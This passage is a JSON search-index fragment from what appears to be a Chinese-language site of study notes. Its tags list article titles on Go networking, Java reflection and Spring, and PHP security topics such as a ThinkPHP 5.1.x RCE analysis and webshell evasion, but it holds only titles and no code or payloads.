\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668 java # None None java\u6587\u4ef6\u7cfb\u7edf Unsafe \u53cd\u5c04\u673a\u5236 \u7c7b\u52a0\u8f7d\u673a\u5236 AOP Bean\u7684\u4f5c\u7528\u57df Bean\u7684\u88c5\u914d HelloSpring Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e Spring\u4f7f\u7528XML\u914d\u7f6e Spring\u7b80\u4ecb \u4ee3\u7406\u6a21\u5f0f \u4f9d\u8d56\u6ce8\u5165(DI) \u63a7\u5236\u53cd\u8f6c(IOC) HelloServlet HttpServletResponse ServletContext Tomcat php # thinkphp 5.1.x RCE register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 webshell\u514d\u6740\u603b\u7ed3 php\u914d\u7f6e # register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 spring # None AOP Bean\u7684\u4f5c\u7528\u57df Bean\u7684\u88c5\u914d HelloSpring Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e Spring\u4f7f\u7528XML\u914d\u7f6e Spring\u7b80\u4ecb \u4ee3\u7406\u6a21\u5f0f \u4f9d\u8d56\u6ce8\u5165(DI) \u63a7\u5236\u53cd\u8f6c(IOC) thinkphp # thinkphp 5.1.x RCE webshell # webshell\u514d\u6740\u603b\u7ed3 \u6587\u4ef6\u5305\u542b # register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 \u6f0f\u6d1e\u5206\u6790 # thinkphp 5.1.x RCE","title":"Tags"},{"location":"tags.html#contents-grouped-by-tag","text":"","title":"Contents grouped by tag"},{"location":"tags.html#golang","text":"\u7b2c\u4e00\u7ae0-Golang\u57fa\u7840 \u7b2c\u4e09\u7ae0-HTTP \u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 \u7b2c\u4e94\u7ae0-DNS \u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668","title":"golang"},{"location":"tags.html#java","text":"None None java\u6587\u4ef6\u7cfb\u7edf Unsafe \u53cd\u5c04\u673a\u5236 \u7c7b\u52a0\u8f7d\u673a\u5236 AOP Bean\u7684\u4f5c\u7528\u57df Bean\u7684\u88c5\u914d HelloSpring Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e Spring\u4f7f\u7528XML\u914d\u7f6e Spring\u7b80\u4ecb \u4ee3\u7406\u6a21\u5f0f \u4f9d\u8d56\u6ce8\u5165(DI) \u63a7\u5236\u53cd\u8f6c(IOC) HelloServlet HttpServletResponse ServletContext Tomcat","title":"java"},{"location":"tags.html#php","text":"thinkphp 5.1.x RCE register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3 webshell\u514d\u6740\u603b\u7ed3","title":"php"},{"location":"tags.html#php\u914d\u7f6e","text":"register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3","title":"php\u914d\u7f6e"},{"location":"tags.html#spring","text":"None AOP Bean\u7684\u4f5c\u7528\u57df Bean\u7684\u88c5\u914d HelloSpring Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e Spring\u4f7f\u7528XML\u914d\u7f6e Spring\u7b80\u4ecb \u4ee3\u7406\u6a21\u5f0f \u4f9d\u8d56\u6ce8\u5165(DI) \u63a7\u5236\u53cd\u8f6c(IOC)","title":"spring"},{"location":"tags.html#thinkphp","text":"thinkphp 5.1.x RCE","title":"thinkphp"},{"location":"tags.html#webshell","text":"webshell\u514d\u6740\u603b\u7ed3","title":"webshell"},{"location":"tags.html#\u6587\u4ef6\u5305\u542b","text":"register argc argv\u4e0einclude\u9650\u5236php\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u7684\u5c0f\u7ed3","title":"\u6587\u4ef6\u5305\u542b"},{"location":"tags.html#\u6f0f\u6d1e\u5206\u6790","text":"thinkphp 5.1.x RCE","title":"\u6f0f\u6d1e\u5206\u6790"}]}